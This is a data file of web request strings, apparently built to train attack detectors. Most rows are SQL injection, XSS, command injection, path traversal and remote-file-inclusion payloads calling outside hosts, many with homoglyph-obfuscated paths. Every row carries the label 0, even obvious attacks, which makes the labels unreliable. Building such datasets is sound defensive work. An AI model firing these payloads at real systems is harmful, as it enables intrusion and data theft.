sentences 	 labels
/ 𝗌𝑡ring / strings / parameters = '  |  | echo qzicoq $  (  ( 45 + 93 )  )  $  ( echo qzicoq ) qzicoq /  /  	 0
/ 𝘀𝘵ring / strings / parameters = < iframe src =  /  onload = eval ( unescape ( this . name . replace (  /  \  / g , null )  )  )  name = fff = new this . contentwindow . window . xmlhttprequest (  )  ; fff . open (  " get "  ,  " xssme2 "  )  ; fff . onreadystatechange = function (  )  { if  ( fff . readystate =  = 4  &  &  fff . status =  = 200 )  { alert ( fff . responsetext )  ;  }  }  ; fff . send (  )  ;  >  <  / iframe >  	 0
/ 𝐞𝓍amples / jsp / cal / index . php ? site =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ m𝖆іn . php ? stuff =  " rm \ x0bq27764952 & rem \ x0b  	 0
/ 𝑠𝘵ring / strings / parameters = ;  str =  $  ( echo uomphd )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 0
/ 𝔰𝙩ring / modo = entrar & login = haze * l & pwd = pluvimetro & remember = off & b1 = entrar  	 0
/ 𝑠𝒕ring / strings / parameters = 1 '  )  )  ; if ( 6554 = 1534 )  select 6554 else drop function buqb --  	 0
/ ѕ𝚝ring / strings / parameters = -9140 "  "  )  )  union all select 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 #  	 0
/ 𝗌𝓉ring / strings / parameters = 1 %  '  )  )  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  (  (  '  %  '  =  '  	 0
/ m𝐚𝔦n . php ? logout =  " ver \ x0b > q12574322 & rem \ x0b  	 0
/ 𝐞𝕩amples / jsp / colors / index . php ? op = default & date = 200607 '  union select 1 , 1739511784 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  	 0
/ 𝐩һpmyadmin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 999630768 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 0
/ j𝑎𝗏ascript /  . passwd . csproj  	 0
/ 𝚜𝐭ring / strings / parameters = < img src =  "  " jav ascript : document . cookie = true ;  "  "  >  	 0
/ 𐑈𝐭ring / modo = registro & login = dickens & password = l '  , 4uenga & nombre = bertilda & apellidos = scampini + benito & email = bevens @ elbauldelosrefranes . gov & dni = 25301830j & direccion = avinguda + joan + march ,  + 14 ,  +  & ciudad = gjar & cp = 11630 & provincia = las + palmas & ntc = 4290013346826591 & b1 = registrar  	 0
/  \  \  \  .  .  \  .  .  \  .  .  \  .  .  \  { file }  	 0
/ 𝚜𝚝ring / strings / parameters = 1 '  )  )  or char ( 68 )  |  | char ( 69 )  |  | char ( 97 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 )  , 0 )  , 5000000000 )  , null )  and  (  (  ' xuwl '  like  ' xuwl  	 0
/ 𝓈𝔱ring / strings / parameters = -6405 '  union all select 8235 , 8235 , 8235 , 8235 , 8235 #  	 0
/ j𝕒𝚌krabbit / search . jsp ? q =  %  "  < script > alert ( 1332010391 )  <  / script >  	 0
/ 𝘀𝗍ring / strings / parameters = "  |   [  2 -ne  $  ( echo xhmatl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 0
/ 𝗌𝙩ring / strings / parameters = 1 '  ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 and  ' bnfu '  like  ' bnfu  	 0
/ ꜱ𝑡ring / strings / parameters = 1 '  )  )  as oocd where 2919 = 2919 or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/ 𝘩𝙚lp . php ? q =  "  \ x0ddel \ x09q93881688 \ x09 #  	 0
/ 𐑈𝓉ring / modo = registro & login = lennard2 & password = segundar & nombre = armelio & apellidos = gochez & email = shankley @ discon . sz & dni = 25054750e & direccion = c /  + fuente + del + rey ,  + s / n ,  +  & ciudad = gavilanes & cp = 36110 & provincia = salamanca & ntc = 679646557157740 & b1 = registrar  	 0
/ 𝘀𝔱ring / strings / parameters = 1 '  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  	 0
/ 𝒔𝓉ring / strings / parameters = 1 "  "  )  )  )  or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  --  	 0
/ 𝑖n𝐜 / articles . inc . php ? globals [ cheminmodules ]  = xxpathxx  	 0
/ 𝓈𝗍ring / modo = entrar & login = dionysus & pwd = any ?  set-cookie :  + tamper = 5765205567234876235 & remember = on & b1 = entrar  	 0
/ 𝘴𝙩ring / strings / parameters = 1 ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual --  vykx  	 0
/ 𝐬𝗍ring / str =  $  ( echo srsafa )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 0
/ 𐑈𝐭ring / strings / parameters = "   str =  $  ( echo synsac )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 0
/ 𝖘𝖙ring / strings / parameters = -2925 %  "  "  or make_set ( 9354 = 9354 , 7185 )  and  "  "  %  "  "  =  "  "  	 0
/ ꜱ𝒕ring / strings / parameters = "  ; echo uzgzpc $  (  ( 74 + 69 )  )  $  ( echo uzgzpc ) uzgzpc &  	 0
/ 𝚌𝑎cti / apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category /  	 0
/ m𝖺𝗂n . php ? stuff =  " ping \ x0b-w \ x0b7000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 | rem \ x0b  	 0
/ j𝐚טascript / base . exe  	 0
/ l𝙖ʋnch . jsp ? nfuse_application =  > alert ( document . cookie )  ;  <  / script >  	 0
/ 𝙘𝑔i-bin / _head . php ? _zb_path =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝚜𝙩ring / strings / parameters = < div style =  "  " width :  expression ( alert (  ' xss '  )  )  ;  "  "  >  	 0
/ 𝙨𝓉ring / strings / parameters = 1 )  where 2679 = 2679 or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  	 0
/ 𝙨𝕥ring / strings / parameters = ) print (  ` echo qqgyps `  .  ` echo  $  (  ( 10 + 39 )  )  `  .  ` echo qqgyps `  .  ` echo qqgyps `  )  ;  \  \ qqgyps  	 0
/ ℮n-𝘂s / esmozg5d . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝒔𝗍ring / strings / parameters = -4728 "  "  )  )  as ndri where 3278 = 3278 or make_set ( 9354 = 9354 , 7185 )  --  	 0
/ 𝗌𝖙ring / strings / parameters = -2979 '  )  )  as klou where 7092 = 7092 union all select 7092 , 7092 --  	 0
/ ƽ𝖙ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo dkkeqz )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ 𑣁𝚝ring / strings / parameters = 1 %  "  "  )  )  )  and make_set ( 8191 = 7813 , 7813 )  and  (  (  (  "  "  %  "  "  =  "  "  	 0
/ 𝚜𝐭ring / modo = registro & login = alexi & password = cuerda & nombre = donardo & apellidos = paracoll '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & email = filho @ encuentrodominios . is & dni = 01722111d & direccion = enric + granados + 137 ,  +  & ciudad = ruesca & cp = 47248 & provincia = alicante & ntc = 0825150389138142 & b1 = registrar  	 0
/ j𝖆ѵascript / _source . exe  	 0
/ 𝙨𝑡ring / strings / parameters = < svg id = javascript : alert ( 1337 )  onload = location = id >  	 0
/ 𝕤𝘁ring / modo = insertar +  & precio = 346 & b1 = confirmar  	 0
/ 𝗌𝓉ring / strings / parameters = ' echo $ ifsfyuxpa $  (  ( 17 + 24 )  )  $  ( echo $ ifsfyuxpa ) fyuxpa '  	 0
/ 𝐬𝔱ring / modo = registro & login = kui-soon & password = a2rava46e & nombre = palmira & apellidos = espasa + radillo & email = provine @ acchportugal . pm & dni =  +  & direccion = pl .  + merced ,  + 147 +  & ciudad = arags + del + puerto & cp = 17860 & provincia = valencia & ntc = 6653520296014464 & b1 = registrar  	 0
/ 𝕤𝓉ring / strings / parameters = |   [  3 -ne  $  ( echo ehxctp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/ j𝒶∨ascript / e . exe  	 0
/ 𝘀𝖙ring / strings / parameters = -9531 '  )  )  )  union all select 4076 , 4076 #  	 0
/ o🯳𝟝zot2r . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝐚z𝕔rfs8d . kspx ?  < meta http-equiv = set-cookie content =  " testjpdr = 9205 "  >  	 0
/ ƽ𝙩ring / strings / parameters = -7514 %  "  "  )  )  )  or 2448 = 8797 #  	 0
/ 𝚜𝘁ring / strings / parameters = \ x3csvg /  < svg / onload = alert (  )  /  /  >  \ x3e  	 0
/ 𐑈𝒕ring / strings / parameters = -8651 "  "  )  where 8391 = 8391 union all select 8391 , 8391 #  	 0
/ 𝔰𝒕ring / strings / parameters = < embed / code =  /  / goo . gl / nlx0p ?  	 0
/ 𝕤𝕥ring / strings / parameters = 1 '  )  as rvli where 4427 = 4427 ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝑟ҽcordings / webadmin . php ? show =  / etc / passwd  	 0
/ һⅇlp . php ? q = ver & rem ;  	 0
/ 𝘴𝙩ring / strings / parameters = < meta http-equiv = set-cookie content =  " testttvs = 7163 "  >  	 0
/ ⅇn-ꭎs / account / smpwservicescgi . exe  	 0
/ 𝓈𝒸ripts / index . php ? src = 1 & _common = 1 & time = 1331919221 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝒔𝔱ring / strings / parameters = ' echo $ ifsjwhawx $  (  ( 24 + 49 )  )  $  ( echo $ ifsjwhawx ) jwhawx "  	 0
/ 𝘀𝔱ring / modo = registro & login = schyndel & password = trufaldina & nombre = yadia & apellidos = puerta + garreta & email = fleur @ drae2 . kh & dni = 52864416c & direccion = parque + de + despeaperros ,  + 159 +  & ciudad = algerriany ?  set-cookie :  + tamper = 5765205567234876235 & cp = 47175 & provincia = zaragoza & ntc = 9535422521832781 & b1 = registrar  	 0
/ 𝖘𝕥ring / strings / parameters = -5757 %  "  "  )  or 6872 = 6872 and  (  "  "  %  "  "  =  "  "  	 0
/ 𝔰𝙘ript / _conf / core / common-tpl-vars . php ? confdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ?  ?  	 0
/ 𐑈𝘵ring / strings / parameters = 1 '  )  where 6634 = 6634 or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  --  	 0
/ 𝔰𝗍ring / strings / parameters = < div style =  "  " behaviour :  url (  [ link to code ]  )  ;  "  "  >  	 0
/ 𝓈𝙩ring / strings / parameters = ; echo $ ifstreosx $  (  ( 82 + 26 )  )  $  ( echo $ ifstreosx ) treosx  	 0
/ 🯸𝔱9v8k7x . pl ?  < meta http-equiv = set-cookie content =  " testhvje = 9403 "  >  	 0
/ 𝒔𝒕ring / strings / parameters = 1 '  )  ; begin dbms_lock . sleep ( 5 )  ;  end  	 0
/ 𝚜𝘁ring / strings / parameters = & lt ; a href =  \  " http &  # 58 ;  /  / 66 &  # 46 ; 102 &  # 46 ; 7 &  # 46 ; 147 /  \  "  & gt ; xss & lt ;  / a & gt ;  	 0
/ 𝔶𝔤kjkngd . cgi ?  < meta http-equiv = set-cookie content =  " testnago = 4518 "  >  	 0
/ j𝖆𝖛ascript / course . exe  	 0
/ 𝙨𝚝ring / strings / parameters = "  |   [  2 -ne  $  ( echo jyvqfk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/ 𝐞хamples / jsp / num / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login  	 0
/ m𝖆ın . php ? logout =  \ x0duname  > q49774432  #  	 0
/ 𝕤𝘁ring / strings / parameters = -4428 )  or 3038 = 3038  	 0
/ ƽ𝓽ring / strings / parameters = -3933 %  "  "  )  )  or elt ( 8142 = 2978 , 2978 )  and  (  (  "  "  %  "  "  =  "  "  	 0
/ ƽ𝓉ring / strings / parameters = ; echo skjoij $  (  ( 68 + 83 )  )  $  ( echo skjoij ) skjoij  	 0
/ 𝓈ᴄripts / livre_include . php ? no_connect = lol & chem_absolu = http :  /  / xxxxxx .  /  	 0
/ 𝓱𝚠3 . cgi ? daysonly = 0 )  . system (  ' id '  )  .  (  	 0
/ m𝗮𝒾n . php ? stuff =  "  & del ; q86839174 & rem ;  	 0
/ l🯴ẝz1dqw . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝚜𝐭ring / strings / parameters = < script a =  `  >  `  src =  " http :  /  / xss . cx / xss . js "  >  <  / script >  	 0
/ 𝗌𝘁ring / strings / parameters = d :  / inetpub / wwwroot / global . asa  	 0
/ 𝕣𝔭xyx07v . jspa ?  < meta http-equiv = set-cookie content =  " testbnli = 1975 "  >  	 0
/ 𝚜𝑡ring / strings / parameters = 1 %  "  "  )  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  (  "  "  %  "  "  =  "  "  	 0
/ 𝗰ƍi-bin / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1  	 0
/ 𝓼𝑐riptpath / footers . php ? tinybb_footers = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  	 0
/ ѕ𝒕ring / strings / parameters = -9120 '  )  )  or 8571 = 8571 --  	 0
/ 𐑈n𝒊ppetmaster / includes / vars . inc . php ? _session [ script_path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  	 0
/ 𝓼𝙩ring / strings / parameters = 1 "  "  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  "  " nzgn "  "  =  "  " nzgn  	 0
/ ꜱ𝒕ring / strings / parameters = 1 '  ; waitfor delay  ' 0 : 0 : 5 '  and  ' gsvt '  =  ' gsvt  	 0
/ ѕ𝘁ring / modo = registro & login = ruzycki & password = aviso & nombre = hugo & apellidos = estrada & email = burston_autin @ 943 . py & dni = 26397342n & direccion = c /  + queralbs ,  + 185 + 10-g & ciudad = santa + eulalia & cp = 10828 & provincia = valencia |  & ntc = 0317961350004584 & b1 = registrar  	 0
/ 𐑈𝒕ring / strings / parameters = 1 '  +  ( select mhfn where 2425 = 2425 ; select count (  *  )  from generate_series ( 1 , 5000000 )  )  +  '  	 0
/ ꜱ𝓽ring / strings / parameters = *  & apos ;  	 0
/ ѕ𝘵ring / modo = registro & login = philips & password = balconaje & nombre = hansel & apellidos = ponseti + vilarrasa & email = zonis-paola @ interanuncios . hk & dni = 52864416c & direccion = calle + el + labrador + s / n + 13c & ciudad = san + isidro & cp = 04868 & provincia = cuenca & ntc = 219909426286098a & b1 = registrar  	 0
/ 𝚛℮cordings / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝑠𝕥ring / strings / parameters = 1 '  +  ( select  ' vtyw '  where 7950 = 7950 order by 1 --  	 0
/ 𝘀𝔱ring / modo = registro & login = ballarte & password = mist66l & nombre = zorella & apellidos = morera & email = cossar @ asdn . be & dni = 36813756w & direccion = calle + alvarez + de + castro + 197 ,  +  & ciudad = vila-real & cp = 19160 & provincia = jan & ntc = 966948476857778 & b1 = registrar  	 0
/ ℯ𝙭amples / jsp / cal / sawmill6cl . exe ? ho +  { complete_version }  	 0
/ 𝖘𝘁ring / strings / parameters = 1 )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/ 𝓹𝐱agj7n7 . asp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝚜𝓉ring / modo = registro & login = kolahi45 & password = o5 $ 57t4 & nombre = segismundo & apellidos = torr & email = unkel-richler @ nanogenerador . bu & dnia = 62093064x & direccion = calle + puerto + oncala ,  + 80 ,  + 7 ? g & ciudad = almazul & cp = 20495 & provincia = navarra & ntc = 9824241120494731 & b1 = registrar  	 0
/ ℯ×amples / jsp / jsp2 / jspx / core / editor . php ? editor_insert_bottom =  / etc / passwd  	 0
/ 𐑈𝐭ring / modo =  ?  & precio = 1510 & b1 = confirmar  	 0
/ 𝗌𝕥ring / strings / parameters = 1 where 5466 = 5466 and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  #  	 0
/ 𝑠𝕥ring / strings / parameters = 1 '  )  and elt ( 4249 = 4249 , 7259 )  	 0
/ 𝐬𝔱ring / strings / parameters = 1 ,  ( select  ( case when  ( 6857 = 7623 )  then 1 else 6857 *  ( select 6857 from information_schema . character_sets )  end )  )  	 0
/ 𝓽o𝙥 . php ? stuff = ping ; -w ; 7000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  	 0
/ 𝕢һvu0pdg . jsp ?  < meta http-equiv = set-cookie content =  " testchuc = 2100 "  >  	 0
/ 𝔠𝓰i / texis . exe / junk  	 0
/ 𝘀𝗍ring / modo = registro & login = bonnar & password = perillana & nombre = benito & apellidos = estruga + barrozzi & email = offerall @ eonon . com . ci & dni = 78627299m & direccion = poetisa + rosalia + de + castro ,  + 41 ,  + 3 ? e & ciudad = valhermoso + de + la + fuente & cp = 24174 & provinciaa = cuenca & ntc = 3588478670456559 & b1 = registrar  	 0
/ ѕ𝘁ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ewgaea )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ 𝗰𝑎cti / webdist . cgi ? distloc =  ; id  	 0
/ 𝗂Ⳓ86v90l . html ?  < meta http-equiv = set-cookie content =  " testfutf = 1550 "  >  	 0
/ 𝔰𝓉ring / strings / parameters = -1048 %  "  "  or 3038 = 3038  	 0
/ аᑯministrator / components / com_clickheat / includes / heatmap / main . php ? mosconfig_absolute_path = xxpathxx  	 0
/ 𝚐𝐩b / include / gpb . inc . php ? root_path = xxpathxx ?  	 0
/ 𝘴𝑡ring / modo = registro & login = izaak & password = calibracin & nombre = hortencia & apellidos = turet + maiorana & email = hannon . white8 @ mtos . st & dni = 88648013x & direccion = c /  + ajuntament + s / n +  & ciudad = santa + mara + del + titar & cp = 50491 & provincia = ourense <  !  --  # include + file =  " archivo_secreto "  +  --  >  & ntc = 6434125672280477 & b1 = registrar  	 0
/ ƽ𝓉ring / modo = insertar & precio = 1825 & b1 = pasar + por + caja /  	 0
/ 𝗌𝓉ring / id = 2 /  & nombre = queso + manchego & precio = 39 & cantidad = 98 & b1 = aadir + al + carrito  	 0
/ 𝘱𝐡pmyadmin / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f  	 0
/ 𝐚l𝖇um . php ? albumid = 1 ' 414095588137  	 0
/ ѕ𝓉ring / strings / parameters = | echo $ ifsyrtpvw $  (  ( 55 + 57 )  )  $  ( echo $ ifsyrtpvw ) yrtpvw "  	 0
/ m𝖺𝑖n . php ? logout =  " ping \ x0b-w \ x0b9000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 | rem \ x0b  	 0
/ 𝚜𝘵ring / strings / parameters = 1 '  +  ( select wgmn where 4368 = 4368 and 7859 = 6151 )  +  '  	 0
/ m𝚊ιlarticle . php ? id =  ' union select 0 , 0 , 0 , 0 , 0 , 0 , username , password , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 from cc_admin /  *  	 0
/ mooԁl𝐞 / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 20 + 72 + 75 + 6e + 20 + 69 + 6e + 20 + 44 + 4f + 53 + 20 + 6d + 6f + 64 + 65 + 24 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 +  +  >  > esbq  	 0
/ 𝕤𝚝ring / modoa = registro & login = shiranth5 & password = petal9192 & nombre = nelma & apellidos = rayo + jaln & email = dubucourt-geoffrey @ intercambioenlaces . name & dni = 75767112y & direccion = plaa + d '  + espanya + 36 + 6-e & ciudad = penagos & cp = 10240 & provincia = mlaga & ntc = 1634165251818381 & b1 = registrar  	 0
/ 𑣁𐐽ripts / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331908736 , 1948616015  --  	 0
/ 𝓈𝓽ring / strings / parameters = 1 %  '  )  )  and  ( 8853 = 9924 )  * 9924 and  (  (  '  %  '  =  '  	 0
/ 𝘀𝓬ripts / search . php ? getdate =  .  / templates / default / admin . tpl  	 0
/ ꜱ𝔠ripts / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331918989 '  )  <  / script >  	 0
/ m𝐚ιn . php ? stuff =  | ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  	 0
/ 𝒕o𝐩 . php ? stuff =  "  ; uname  > q35544877  #  	 0
/ 𝖈om𝗉onents / com_mospray / scripts / admin . php ? basedir =  @ rfiurl ? basedir =  @ rfiurl ?  & cmd = id  	 0
/ 𝐡𝒕8pn8uq . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝓼𝘁ring / strings / parameters = -9509 )  union all select 1193 , 1193 , 1193 #  	 0
/ 𝓈𝚝ring / strings / parameters = -3861 '  )  as zmja where 4036 = 4036 or 9323 = 9323 #  	 0
/ ᴄαcti / directory . php ? dir =  ; cat  / etc / passwd  	 0
/ 𝘀𝘵ring / strings / parameters = -5058 %  '  union all select 6789 , 6789 , 6789 , 6789 , 6789 #  	 0
/ 𝕤𝐭ring / strings / parameters = < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  	 0
/ 𝕤𝓽ring / strings / parameters = 1 '  )  )  and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  ' novq '  =  ' novq  	 0
/ j𝒶𝕧ascript / index_1 . exe  	 0
/ 𝓈𝖙ring / modo = insertar & precio = 5003 & b1 = confirmar /  	 0
/ 𝕤𐐽ript / ident / loginmodif . php ? path_inc = http :  /  / cirt . net / rfiinc . txt ?  	 0
